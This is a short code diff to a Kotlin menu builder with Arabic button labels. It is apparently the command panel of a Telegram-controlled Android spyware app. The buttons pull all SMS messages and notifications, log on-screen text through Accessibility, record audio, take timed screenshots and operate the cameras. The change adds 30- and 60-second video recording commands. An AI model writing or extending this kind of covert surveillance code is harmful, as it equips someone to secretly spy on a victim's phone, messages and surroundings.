@@ -18,7 +18,7 @@ object KeyboardBuilder {
         ))
         rows.put(row(btn("📩 كل الرسائل SMS", "sms_all")))
         rows.put(row(btn("🔔 كل الإشعارات", "notifs_all")))
-        rows.put(row(btn("📝 نصوص الشاشة (Accessibility)", "accessibility_log")))
+        rows.put(row(btn("📝 نصوص الشاشة", "accessibility_log")))
         rows.put(row(btn("🗑 حذف نصوص Accessibility", "accessibility_clear")))
         rows.put(row(
             btn("🎤 بدء التسجيل", "audio_start"),
@@ -29,6 +29,8 @@ object KeyboardBuilder {
             btn("📷 لقطات كل 30s", "screen_loop_start"),
             btn("🛑 إيقاف اللقطات", "screen_loop_stop")
         ))
+        rows.put(row(btn("📹 تسجيل فيديو 30s", "video_30")))
+        rows.put(row(btn("📹 تسجيل فيديو 60s", "video_60")))
         rows.put(row(
             btn("🤳 كاميرا أمامية", "cam_front"),
             btn("📸 كاميرا خلفية", "cam_back")
